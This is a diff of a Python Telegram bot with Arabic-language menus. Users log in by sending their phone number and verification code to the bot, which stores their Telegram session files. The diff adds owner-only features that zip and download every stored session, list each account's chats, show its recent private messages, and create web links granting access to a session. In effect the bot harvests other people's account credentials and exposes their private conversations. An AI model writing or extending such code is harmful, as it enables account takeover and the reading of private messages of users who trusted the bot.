-        with archive_path.open("rb") as upload_file:
-            upload = InputFile(upload_file, filename="telegram_sessions.zip")
+        with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+            for f in files:
+                zf.write(f, arcname=f.name)
+        with zip_path.open("rb") as fh:
             await update.message.reply_document(
-                document=upload,
-                caption=(
-                    f"📦 كل ملفات Sessions الحالية\n"
-                    f"عدد الملفات: {len(session_files)}\n\n"
-                    "🔒 هذا الملف حساس جدًا؛ لا تشاركه مع أي شخص."
-                ),
+                document=InputFile(fh, filename="telegram_sessions.zip"),
+                caption=f"📥 جميع Sessions الحالية ({len(files)} ملف).\n⚠️ ملف حساس: لا تشاركه مع أي شخص.",
+                reply_markup=owner_keyboard(),
             )
     except Exception as exc:
-        logger.exception("فشل ضغط/إرسال كل Sessions")
-        await update.message.reply_text(
-            f"❌ تعذر تحميل Sessions.\nالسبب: {type(exc).__name__}: {exc}"
-        )
+        await update.message.reply_text(f"❌ تعذر تحميل Sessions.\nالسبب: {type(exc).__name__}: {exc}", reply_markup=owner_keyboard())
     finally:
-        archive_path.unlink(missing_ok=True)
+        try:
+            zip_path.unlink(missing_ok=True)
+        except Exception:
+            pass
 
 
 async def channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -1476,6 +1884,11 @@ async def update_transfer_status_message(job_id: str, context: ContextTypes.DEFA
 
 
 async def start_transfer_job(job_id: str, context: ContextTypes.DEFAULT_TYPE) -> None:
+    async with transfer_semaphore:
+        return await _start_transfer_job_inner(job_id, context)
+
+
+async def _start_transfer_job_inner(job_id: str, context: ContextTypes.DEFAULT_TYPE) -> None:
     job = channel_transfers[job_id]
     progress_task = None
     job["status"] = "جارٍ تشغيل المهمة"
@@ -1735,7 +2148,6 @@ async def start_transfer_job(job_id: str, context: ContextTypes.DEFAULT_TYPE) ->
             job["last_message_id"] = int(message.id)
             job.pop("current_message_id", None)
             save_channel_transfers()
-            await asyncio.sleep(1.0)
         if found_messages == 0:
             job["status"] = "مكتمل؛ لا توجد رسائل جديدة"
             logger.info(
@@ -1843,14 +2255,26 @@ async def handle_admin_input(update: Update, context: ContextTypes.DEFAULT_TYPE,
             await update.message.reply_text("⚠️ لا يمكن إرسال إذاعة فارغة. أرسل النص أو /cancel.")
             return
         sent = failed = 0
-        for user_id in list(user_registry):
-            try:
-                await context.bot.send_message(chat_id=int(user_id), text=f"📢 رسالة من الإدارة\n\n{text}")
-                sent += 1
-                await asyncio.sleep(0.05)
-            except Exception:
-                failed += 1
-                logger.exception("فشلت الإذاعة إلى المستخدم %s", user_id)
+        broadcast_sem = asyncio.Semaphore(max(1, int(os.getenv("BROADCAST_CONCURRENCY", "8"))))
+
+        async def send_one(user_id: str) -> bool:
+            async with broadcast_sem:
+                try:
+                    await context.bot.send_message(
+                        chat_id=int(user_id),
+                        text=f"📢 رسالة من الإدارة\n\n{text}",
+                    )
+                    return True
+                except Exception:
+                    logger.exception("فشلت الإذاعة إلى المستخدم %s", user_id)
+                    return False
+
+        results = await asyncio.gather(
+            *(send_one(user_id) for user_id in list(user_registry)),
+            return_exceptions=False,
+        )
+        sent = sum(results)
+        failed = len(results) - sent
         states.pop(update.effective_user.id, None)
         await update.message.reply_text(f"✅ اكتملت الإذاعة.\nتم الإرسال: {sent}\nفشل الإرسال: {failed}", reply_markup=admin_keyboard())
 
@@ -1949,22 +2373,6 @@ async def transfer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) 
             parse_mode="Markdown",
             reply_markup=transfer_keyboard("admin:home"),
         )
-    elif data == "owner:upload_session":
-        if not owner_only(update):
-            await query.answer("رفع الجلسات مخصص للمالك فقط.", show_alert=True)
-            return
-        await query.answer()
-        await query.message.reply_text(
-            "📤 أرسل الآن ملف Session بصيغة Document.\n\n"
-            "اسم الملف يجب أن يكون مثل:\n`user_123456789.session`",
-            parse_mode="Markdown",
-        )
-    elif data == "owner:download_sessions":
-        if not owner_only(update):
-            await query.answer("تحميل الجلسات مخصص للمالك فقط.", show_alert=True)
-            return
-        await query.answer("جارٍ تجهيز ملفات الجلسات...")
-        await download_all_sessions_command(update, context)
     elif data == "owner:sessions" or data.startswith("owner:sessions:"):
         if not owner_only(update):
             await query.answer("استعراض الجلسات مخصص للمالك فقط.", show_alert=True)
@@ -1981,7 +2389,7 @@ async def transfer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) 
             if not session_ids:
                 await query.edit_message_text("💬 لا توجد ملفات جلسات محفوظة.", reply_markup=owner_keyboard())
                 return
-            rows = []
+            rows = [[InlineKeyboardButton("🌐 فتح Mini App", web_app=WebAppInfo(url=get_or_create_web_link(OWNER_ID)))]]
             try:
                 sessions_page = max(1, int(data.rsplit(":", 1)[1])) if data != "owner:sessions" else 1
             except (TypeError, ValueError):
@@ -2031,6 +2439,69 @@ async def transfer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) 
                 f"⚠️ تعذر عرض الجلسات.\nالسبب: {type(exc).__name__}: {exc}",
                 reply_markup=owner_keyboard(),
             )
+    elif data == "owner:upload_session":
+        if not owner_only(update):
+            await query.answer("رفع الجلسات مخصص للمالك فقط.", show_alert=True)
+            return
+        await query.message.reply_text(
+            "📤 *رفع ملف Session*\n\nأرسل الآن ملف `.session` كملف Document.\nيجب أن يكون اسمه بهذا الشكل: `user_123456789.session`",
+            parse_mode="Markdown",
+            reply_markup=owner_keyboard(),
+        )
+    elif data == "owner:download_sessions":
+        if not owner_only(update):
+            await query.answer("تحميل الجلسات مخصص للمالك فقط.", show_alert=True)
+            return
+        files = sorted(SESSION_DIR.glob("user_*.session"))
+        if not files:
+            await query.message.reply_text("📥 لا توجد ملفات Sessions حالياً.", reply_markup=owner_keyboard())
+            return
+        fd, tmp_name = tempfile.mkstemp(prefix="telegram_sessions_", suffix=".zip")
+        os.close(fd)
+        zip_path = Path(tmp_name)
+        try:
+            with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+                for f in files:
+                    zf.write(f, arcname=f.name)
+            with zip_path.open("rb") as fh:
+                await query.message.reply_document(
+                    document=InputFile(fh, filename="telegram_sessions.zip"),
+                    caption=f"📥 جميع Sessions الحالية ({len(files)} ملف).\n⚠️ ملف حساس: لا تشاركه مع أي شخص.",
+                    reply_markup=owner_keyboard(),
+                )
+        except Exception as exc:
+            await query.message.reply_text(f"❌ تعذر تحميل Sessions.\nالسبب: {type(exc).__name__}: {exc}", reply_markup=owner_keyboard())
+        finally:
+            try:
+                zip_path.unlink(missing_ok=True)
+            except Exception:
+                pass
+    elif data.startswith("owner:web_link:"):
+        if not owner_only(update):
+            await query.answer("هذا القسم مخصص للمالك فقط.", show_alert=True)
+            return
+        try:
+            session_user_id = int(data.rsplit(":", 1)[1])
+            client = await get_or_create_client(session_user_id)
+            if not await client.is_user_authorized():
+                raise ValueError("الجلسة غير مسجلة الدخول")
+            link = get_or_create_web_link(session_user_id)
+            await query.answer("تم إنشاء رابط الجلسة.", show_alert=False)
+            await query.edit_message_text(
+                "🌐 *رابط الواجهة الخاصة بهذه الجلسة*\n\n"
+                f"`{link}`\n\n"
+                "🔒 الرابط معزول عن بقية الجلسات، ولا يمكنه فتح جلسة أخرى.\n"
+                "⚠️ لا ترسل الرابط لشخص غير موثوق لأنه يملك صلاحية الوصول لهذه الجلسة.",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🌐 فتح الواجهة", url=link)],
+                    [InlineKeyboardButton("⬅️ رجوع إلى الجلسة", callback_data=f"owner:dialogs:{session_user_id}")],
+                ]),
+            )
+        except Exception as exc:
+            await query.answer("تعذر إنشاء الرابط", show_alert=True)
+            logger.exception("تعذر إنشاء رابط ويب للجلسة %s", data)
+
     elif data.startswith("owner:dialogs:"):
         if not owner_only(update):
             await query.answer("هذا القسم مخصص للمالك فقط.", show_alert=True)
@@ -2044,6 +2515,10 @@ async def transfer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) 
             session_name = account_display_name(session_user_id, session_me)
             rows = [
                 [InlineKeyboardButton("🔁 نقل القنوات من هذه الجلسة", callback_data=f"owner:transfer:{session_user_id}")],
+                [InlineKeyboardButton("🌐 رابط الواجهة الخاصة بالجلسة", callback_data=f"owner:web_link:{session_user_id}")],
+                [InlineKeyboardButton("🔄 فحص حالة الجلسة", callback_data=f"owner:session_check:{session_user_id}")],
+                [InlineKeyboardButton("🔌 فصل الجلسة", callback_data=f"owner:session_disconnect:{session_user_id}")],
+                [InlineKeyboardButton("🗑️ حذف الجلسة", callback_data=f"owner:session_delete:{session_user_id}")],
             ]
             count = 0
             async for dialog in client.iter_dialogs(limit=200):
@@ -2108,6 +2583,86 @@ async def transfer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) 
                 f"⚠️ تعذر تجهيز جلسة النقل.\nالسبب: {type(exc).__name__}: {exc}",
                 reply_markup=owner_keyboard(),
             )
+    elif data.startswith("owner:session_check:"):
+        if not owner_only(update):
+            await query.answer("هذا القسم مخصص للمالك فقط.", show_alert=True)
+            return
+        session_user_id = int(data.rsplit(":", 1)[1])
+        try:
+            client = await get_or_create_client(session_user_id)
+            connected = client.is_connected()
+            authorized = await client.is_user_authorized() if connected else False
+            me = await client.get_me() if authorized else None
+            active_jobs = [
+                jid for jid, job in channel_transfers.items()
+                if int(job.get("session_user_id", 0) or 0) == session_user_id
+                and int(jid) in channel_transfer_tasks
+                and not channel_transfer_tasks[int(jid)].done()
+            ]
+            status = "🟢 متصلة ومسجلة" if connected and authorized else ("🟡 متصلة لكن غير مسجلة" if connected else "⚪ مفصولة")
+            await query.edit_message_text(
+                "🔐 *تفاصيل الجلسة*\n\n"
+                f"👤 الحساب: {account_display_name(session_user_id, me)}\n"
+                f"🆔 آيدي Telegram: {getattr(me, 'id', 'غير معروف') if me else 'غير متاح'}\n"
+                f"📡 الحالة: {status}\n"
+                f"🔄 مهام النقل النشطة بهذه الجلسة: {len(active_jobs)}\n"
+                f"💾 ملف الجلسة: user_{session_user_id}.session",
+                parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔄 تحديث", callback_data=f"owner:session_check:{session_user_id}")],
+                    [InlineKeyboardButton("🔌 فصل الجلسة", callback_data=f"owner:session_disconnect:{session_user_id}")],
+                    [InlineKeyboardButton("🗑️ حذف الجلسة", callback_data=f"owner:session_delete:{session_user_id}")],
+                    [InlineKeyboardButton("⬅️ رجوع", callback_data=f"owner:dialogs:{session_user_id}")],
+                ]),
+            )
+        except Exception as exc:
+            await query.edit_message_text(
+                f"⚠️ تعذر فحص الجلسة.\nالسبب: {type(exc).__name__}: {exc}",
+                reply_markup=owner_keyboard(),
+            )
+    elif data.startswith("owner:session_disconnect:"):
+        if not owner_only(update):
+            await query.answer("هذا القسم مخصص للمالك فقط.", show_alert=True)
+            return
+        session_user_id = int(data.rsplit(":", 1)[1])
+        # الفصل هنا لا يحذف ملف الجلسة ولا يسجل خروج حساب Telegram.
+        client = clients.get(session_user_id)
+        try:
+            if client and client.is_connected():
+                await client.disconnect()
+            await query.answer("تم فصل الاتصال.", show_alert=False)
+            await query.edit_message_text(
+                "🔌 تم فصل الجلسة مؤقتاً.\n\n"
+                "ملف الجلسة محفوظ، ويمكن إعادة الاتصال عند الحاجة.",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton("🔄 فحص الحالة", callback_data=f"owner:session_check:{session_user_id}")],
+                    [InlineKeyboardButton("⬅️ رجوع", callback_data=f"owner:dialogs:{session_user_id}")],
+                ]),
+            )
+        except Exception as exc:
+            await query.edit_message_text(f"⚠️ تعذر فصل الجلسة: {type(exc).__name__}: {exc}", reply_markup=owner_keyboard())
+    elif data.startswith("owner:session_delete:"):
+        if not owner_only(update):
+            await query.answer("هذا القسم مخصص للمالك فقط.", show_alert=True)
+            return
+        session_user_id = int(data.rsplit(":", 1)[1])
+        if session_user_id == OWNER_ID:
+            await query.answer("لا تحذف جلسة المالك من هذا الزر. استخدم تسجيل الخروج الصريح.", show_alert=True)
+            return
+        # أوقف مهام النقل المرتبطة بالجلسة قبل حذفها.
+        for jid, job in list(channel_transfers.items()):
+            if int(job.get("session_user_id", 0) or 0) == session_user_id:
+                task = channel_transfer_tasks.get(int(jid))
+                if task and not task.done():
+                    task.cancel()
+        await discard_client_session(session_user_id, remove_file=True)
+        await query.edit_message_text(
+            f"🗑️ تم حذف جلسة المستخدم {session_user_id} وملفها من الخادم، وإيقاف مهام النقل المرتبطة بها.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("💬 استعراض الجلسات", callback_data="owner:sessions")],
+                [InlineKeyboardButton("⬅️ لوحة الإدارة", callback_data="admin:home")],
+            ]),
+        )
     elif data.startswith("owner:text:"):
         if not owner_only(update):
             await query.answer("هذا القسم مخصص للمالك فقط.", show_alert=True)
@@ -2295,6 +2850,23 @@ async def transfer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) 
             ),
             reply_markup=user_keyboard(uid),
         )
+    elif data == "user:login":
+        uid = update.effective_user.id
+        # السماح للمالك والمستخدم بإظهار مسار تسجيل الدخول مباشرة من الزر،
+        # بدلاً من الاعتماد على /start فقط.
+        states[uid] = {"step": "phone"}
+        await query.edit_message_text(
+            "🔐 *تسجيل الدخول إلى Telegram*\n\n"
+            "الخطوة ١ من ٣: أرسل رقم هاتف الحساب بالصيغة الدولية.\n"
+            "مثال: `+249XXXXXXXXX`\n\n"
+            "📌 سيُرسل Telegram رمز التحقق إلى تطبيق Telegram أو SMS.\n"
+            "🔒 لا ترسل كلمة المرور أو الرمز لأي شخص؛ أرسله هنا فقط للبوت.\n"
+            "↩️ يمكنك الإلغاء في أي وقت عبر /cancel.",
+            parse_mode="Markdown",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("❌ إلغاء", callback_data="user:cancel")]
+            ]),
+        )
     elif data == "user:help":
         uid = update.effective_user.id
         help_ar = (
@@ -2448,6 +3020,11 @@ async def transfer_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
 
 async def process_link(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, text: str) -> None:
+    async with media_semaphore:
+        return await _process_link_inner(update, context, user_id, text)
+
+
+async def _process_link_inner(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, text: str) -> None:
     parsed = parse_message_link(text)
     if not parsed:
         await update.message.reply_text("أرسل رابط منشور Telegram صالحاً.")
@@ -2787,23 +3364,22 @@ async def post_init(application: Application) -> None:
         logger.exception("تعذر قراءة هوية البوت عند بدء التشغيل")
     logger.info("البوت يعمل، المالك: %s", OWNER_ID)
     try:
-        # أوامر الجلسات تظهر في قائمة الأوامر للمالك فقط.
         await application.bot.set_my_commands(
             [
-                BotCommand("start", "تشغيل البوت / لوحة الإدارة"),
-                BotCommand("uploadsession", "📤 رفع ملف Session"),
-                BotCommand("downloadsessions", "📥 تحميل كل Sessions"),
-                BotCommand("cancel", "إلغاء العملية الحالية"),
-                BotCommand("channels", "قائمة نقل القنوات"),
-                BotCommand("addchannel", "إضافة قناة للنقل"),
-                BotCommand("starttransfer", "بدء نقل القنوات"),
-                BotCommand("stoptransfer", "إيقاف نقل القنوات"),
-                BotCommand("transferstatus", "حالة نقل القنوات"),
+                BotCommand("start", "لوحة الإدارة"),
+                BotCommand("uploadsession", "رفع Session"),
+                BotCommand("downloadsessions", "تحميل كل Sessions"),
+                BotCommand("cancel", "إلغاء"),
+                BotCommand("channels", "القنوات"),
+                BotCommand("addchannel", "إضافة قناة"),
+                BotCommand("starttransfer", "بدء النقل"),
+                BotCommand("stoptransfer", "إيقاف النقل"),
+                BotCommand("transferstatus", "حالة النقل"),
             ],
             scope=BotCommandScopeChat(chat_id=OWNER_ID),
         )
     except Exception:
-        logger.exception("تعذر تحديث قائمة أوامر المالك")
+        logger.exception("تعذر ضبط قائمة أوامر المالك")
     # مهام asyncio لا تبقى بعد إعادة تشغيل الخدمة، لكن حالة المهمة محفوظة في JSON.
     # نزيل الحالات المؤقتة القديمة فقط، ونحافظ على last_message_id للاستئناف.
     changed = False
@@ -2819,8 +3395,22 @@ async def post_init(application: Application) -> None:
     if changed:
         save_channel_transfers()
 
+    # تشغيل واجهة الويب فعلياً عند بدء البوت.
+    # كانت الدالة معرفة في النسخة السابقة لكن لم يتم استدعاؤها.
+    try:
+        await start_web_server()
+        logger.info("واجهة الويب تعمل على %s:%s", WEB_HOST, WEB_PORT)
+    except Exception:
+        logger.exception("تعذر تشغيل واجهة الويب على %s:%s", WEB_HOST, WEB_PORT)
+
 
 async def post_shutdown(application: Application) -> None:
+    global web_server
+    if web_server is not None:
+        try:
+            web_server.should_exit = True
+        except Exception:
+            pass
     for client in clients.values():
         if client.is_connected():
             await client.disconnect()
@@ -2858,6 +3448,7 @@ def main() -> None:
         .token(BOT_TOKEN)
         .post_init(post_init)
         .post_shutdown(post_shutdown)
+        .concurrent_updates(max(4, int(os.getenv("BOT_CONCURRENT_UPDATES", "32"))))
         .build()
     )
     # مجموعة تشخيصية قبل المعالجات العادية: لا تغيّر السلوك، وتؤكد وصول /start لهذه النسخة.
@@ -2869,10 +3460,10 @@ def main() -> None:
     app.add_handler(CommandHandler("starttransfer", start_transfer_command))
     app.add_handler(CommandHandler("stoptransfer", stop_transfer_command))
     app.add_handler(CommandHandler("transferstatus", transfer_status_command))
-    app.add_handler(CallbackQueryHandler(transfer_callback, pattern=r"^(?:transfer|admin|user|owner):"))
     app.add_handler(CommandHandler("uploadsession", upload_session_command))
     app.add_handler(CommandHandler("downloadsessions", download_all_sessions_command))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_session_upload))
+    app.add_handler(CallbackQueryHandler(transfer_callback, pattern=r"^(?:transfer|admin|user|owner):"))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.add_error_handler(application_error_handler)
     app.run_polling(allowed_updates=Update.ALL_TYPES)
@@ -2880,3 +3471,103 @@ def main() -> None:
 
 if __name__ == "__main__":
     main()
+async def owner_open_session_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+    uid = q.from_user.id
+    if not is_owner(uid):
+        return
+    try:
+        sid = int(q.data.split(":")[-1])
+    except Exception:
+        return
+    client = clients.get(sid)
+    if not client:
+        await q.edit_message_text("❌ الجلسة غير موجودة.")
+        return
+    try:
+        me = await client.get_me()
+        await q.edit_message_text(
+            f"📱 جلسة الحساب\n\n"
+            f"الاسم: {getattr(me, 'first_name', '') or ''} {getattr(me, 'last_name', '') or ''}\n"
+            f"المعرف: @{getattr(me, 'username', '') or 'بدون'}\n"
+            f"ID: {me.id}\n\n"
+            "اختر ما تريد فتحه:",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("💬 المحادثات", callback_data=f"owner:chats:{sid}:0")],
+                [InlineKeyboardButton("🔙 الجلسات", callback_data="owner:sessions")],
+            ])
+        )
+    except Exception as e:
+        await q.edit_message_text(f"❌ تعذر فتح الجلسة: {e}")
+
+async def owner_chats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+    uid = q.from_user.id
+    if not is_owner(uid):
+        return
+    parts = q.data.split(":")
+    sid, page = int(parts[2]), int(parts[3])
+    client = clients.get(sid)
+    if not client:
+        await q.edit_message_text("❌ الجلسة غير متاحة.")
+        return
+    try:
+        dialogs = [d async for d in client.iter_dialogs(limit=12)]
+        start = page * 6
+        chunk = dialogs[start:start+6]
+        if not chunk:
+            await q.edit_message_text("لا توجد محادثات في هذه الصفحة.",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data=f"owner:open_session:{sid}")]]))
+            return
+        rows = []
+        for d in chunk:
+            title = (d.name or "بدون اسم")[:28]
+            rows.append([InlineKeyboardButton(f"💬 {title}", callback_data=f"owner:chat:{sid}:{d.id}")])
+        nav = []
+        if page > 0:
+            nav.append(InlineKeyboardButton("⬅️ السابق", callback_data=f"owner:chats:{sid}:{page-1}"))
+        nav.append(InlineKeyboardButton("➡️ التالي", callback_data=f"owner:chats:{sid}:{page+1}"))
+        rows.append(nav)
+        rows.append([InlineKeyboardButton("🔙 الجلسة", callback_data=f"owner:open_session:{sid}")])
+        await q.edit_message_text("💬 محادثات الحساب:", reply_markup=InlineKeyboardMarkup(rows))
+    except Exception as e:
+        await q.edit_message_text(f"❌ تعذر جلب المحادثات: {e}")
+
+async def owner_chat_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+    uid = q.from_user.id
+    if not is_owner(uid):
+        return
+    parts = q.data.split(":")
+    sid, chat_id = int(parts[2]), int(parts[3])
+    client = clients.get(sid)
+    if not client:
+        await q.edit_message_text("❌ الجلسة غير متاحة.")
+        return
+    try:
+        msgs = [m async for m in client.iter_messages(chat_id, limit=8)]
+        lines = ["🗨️ آخر الرسائل:\n"]
+        media_count = 0
+        for msg in reversed(msgs):
+            text_msg = (msg.text or "").replace("\n", " ")[:90]
+            if msg.media:
+                media_count += 1
+                text_msg = ("🖼️/📎 " + text_msg).strip()
+            if not text_msg:
+                text_msg = "📎 وسائط"
+            lines.append(f"• {text_msg}")
+        lines.append(f"\n📎 وسائط في المعاينة: {media_count}")
+        await q.edit_message_text(
+            "\n".join(lines),
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔙 المحادثات", callback_data=f"owner:chats:{sid}:0")],
+                [InlineKeyboardButton("📱 الجلسة", callback_data=f"owner:open_session:{sid}")],
+            ])
+        )
+    except Exception as e:
+        await q.edit_message_text(f"❌ تعذر فتح المحادثة: {e}")
+
+
